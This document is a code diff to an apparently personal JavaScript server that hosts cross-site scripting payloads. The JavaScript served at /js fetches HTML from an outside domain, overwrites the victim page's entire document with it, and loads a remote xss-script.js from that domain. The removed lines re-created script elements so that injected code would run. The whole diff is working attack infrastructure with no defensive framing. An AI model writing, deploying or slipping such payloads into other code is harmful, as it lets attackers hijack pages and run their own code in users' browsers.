@@ -22,6 +22,16 @@ serve({
       });
     }
 
+    if (url.pathname === "/xss-script.js" && req.method === "GET") {
+      const jsCode = fs.readFileSync("xss-script.js", "utf-8");
+      return new Response(jsCode, {
+        headers: {
+          "Content-Type": "application/javascript",
+          "Access-Control-Allow-Origin": origin,
+        },
+      });
+    }
+
     if (url.pathname === "/js" && req.method === "GET") {
       const jsCode = `
 console.log('Evaluating JS string');
@@ -29,23 +39,20 @@ fetch('https://data.estebanmf.space/xss')
 .then(t => t.text())
 .then(d => {
 console.log('Fetched HTML:', d);
-document.body.innerHTML = d;
-// Force execute all scripts by replacing them with new elements
-const scripts = document.querySelectorAll('script');
-scripts.forEach(oldScript => {
-const newScript = document.createElement('script');
-if (oldScript.src) {
-newScript.src = oldScript.src;
-} else {
-newScript.textContent = oldScript.innerHTML;
-}
-// Add any attributes if needed (e.g., type, async)
-Array.from(oldScript.attributes).forEach(attr => {
-if (attr.name !== 'src') newScript.setAttribute(attr.name, attr.value);
-});
-oldScript.parentNode.replaceChild(newScript, oldScript);
-console.log('Executed script:', newScript.textContent.substring(0, 50) + '...'); // Debug log
-});
+// Construct full HTML document
+document.documentElement.innerHTML = \`
+<!DOCTYPE html>
+<html>
+<head>
+<title>XSS</title>
+</head>
+<body>
+\${d}
+<script src="https://data.estebanmf.space/xss-script.js"></script>
+</body>
+</html>
+\`;
+console.log('HTML and script injected');
 })
 .catch(e => console.error('Fetch error:', e));
 `;
